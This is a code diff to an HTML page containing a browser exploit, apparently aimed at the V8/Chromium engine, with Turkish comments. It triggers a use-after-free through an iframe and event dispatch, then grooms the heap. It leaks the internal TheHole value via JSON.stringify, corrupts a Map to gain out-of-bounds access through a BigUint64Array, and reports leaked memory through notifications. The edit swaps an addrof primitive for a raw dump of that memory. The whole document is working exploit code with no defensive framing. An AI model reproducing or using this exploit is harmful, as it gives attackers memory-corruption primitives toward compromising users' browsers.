@@ -4,7 +4,7 @@
 <button onclick="main()">Trigger UAF + addrof</button>
 <script>
 function main() {
-    // ========== UAF TETİKLE ==========
+    // UAF tetikle
     const f = document.body.appendChild(document.createElement('iframe'));
 
     const a = document.createElement('div');
@@ -29,21 +29,15 @@ function main() {
 
     b.dispatchEvent(new Event('a', { bubbles: true }));
 
-    // ========== UAF SONRASI GROOMING ==========
-    // TheHole oluştur
+    // Grooming
     let hole = null;
     let a2 = [], b2 = [];
     let s = 'A'.repeat(0x80000);
     a2[20000] = s;
     for (let i = 0; i < 10; i++) a2[i] = s;
     for (let i = 0; i < 10; i++) b2[i] = a2;
-    try {
-        JSON.stringify(b2);
-    } catch (e) {
-        hole = e;
-    }
+    try { JSON.stringify(b2); } catch(e) { hole = e; }
 
-    // Map ile grooming
     let map = new Map();
     map.set(1, 1);
     map.set(hole, 1);
@@ -52,23 +46,16 @@ function main() {
     map.delete(1);
     map.set(0x10, -1);
 
-    // OOB array oluştur
-    let oob_arr = new BigUint64Array(0x20);
-    let victim_arr = new BigUint64Array(2);
+    let oob = new BigUint64Array(0x40);
+    let victim = new BigUint64Array(2);
     let obj_arr = new Array({}, {});
 
-    // `obj_arr[0]` in adresini oku (addrof)
-    function addrof(obj) {
-        obj_arr[0] = obj;
-        // `oob_arr[39]` indeksini test ile bul
-        return (oob_arr[39] & 0xffffffffn) - 1n;
+    // OOB array'deki değerleri bildirim olarak gönder
+    for (let i = 0; i < oob.length; i++) {
+        if (oob[i] !== 0n) {
+            send_notification("Index " + i + ": " + oob[i].toString(16));
+        }
     }
-
-    // Test: string'in adresini al
-    let test_str = "AAAAA";
-    let test_addr = addrof(test_str);
-    
-    send_notification("addrof test: " + test_addr.toString(16));
 }
 </script>
 </body>
